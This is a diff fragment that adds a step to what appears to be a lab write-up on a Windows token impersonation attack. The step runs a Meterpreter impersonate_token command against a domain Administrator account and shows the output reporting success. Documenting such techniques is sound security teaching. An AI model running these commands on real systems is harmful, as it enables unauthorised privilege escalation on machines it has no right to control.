@@ -401,6 +401,31 @@ Impersonation Tokens Available
 No tokens available
 ```
 
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step3.png" width="600">
+</p>
+
+## Step 4 - Impersonate the Administrator Token
+
+```bash
+impersonate_token "READTEAMBD\\Administrator"
+```
+
+```text
+meterpreter > impersonate_token READTEAMBD\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user READTEAMBD\Administrator
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
